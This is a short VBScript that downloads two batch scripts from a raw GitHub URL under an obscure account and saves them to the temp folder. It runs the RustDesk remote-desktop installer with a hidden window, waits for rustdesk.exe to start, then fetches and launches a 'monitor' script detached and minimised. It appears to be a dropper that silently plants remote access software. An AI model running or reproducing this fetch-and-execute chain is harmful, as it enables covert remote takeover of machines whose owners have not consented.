Option Explicit

Dim fso, shell, tempFolder, installFile, monitorFile
Dim installUrl, monitorUrl

' === CONFIG ===
installUrl = "https://raw.githubusercontent.com/hgnstorev2/tresdf/main/install_rustdesk.bat"
monitorUrl = "https://raw.githubusercontent.com/hgnstorev2/tresdf/main/rustdesk_monitor.bat"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
installFile = tempFolder & "\install_rustdesk.bat"
monitorFile = tempFolder & "\rustdesk_monitor.bat"

Sub DownloadFile(url, path)
    Dim xhr, stream
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", url, False
    xhr.Send

    If xhr.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xhr.responseBody
        stream.SaveToFile path, 2
        stream.Close
    Else
        MsgBox "Failed to download: " & url & vbCrLf & "Status: " & xhr.Status
        WScript.Quit 1
    End If
End Sub

' === STEP 1: Download the installer script
DownloadFile installUrl, installFile

' === STEP 2: Run installer silently and wait
shell.Run """" & installFile & """", 0, True

' === STEP 3: Wait until RustDesk is running
Do While Not IsProcessRunning("rustdesk.exe")
    WScript.Sleep 2000  ' check every 2 seconds
Loop

' === STEP 4: Download the monitor script AFTER RustDesk is running
DownloadFile monitorUrl, monitorFile

' === STEP 5: Run monitor script detached
shell.Run "cmd /c start ""RustDesk Monitor"" /min """ & monitorFile & """", 0, False


' === Check if RustDesk is running ===
Function IsProcessRunning(procName)
    Dim objWMIService, colProcessList, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & procName & "'")

    If colProcessList.Count > 0 Then
        IsProcessRunning = True
    Else
        IsProcessRunning = False
    End If
End Function
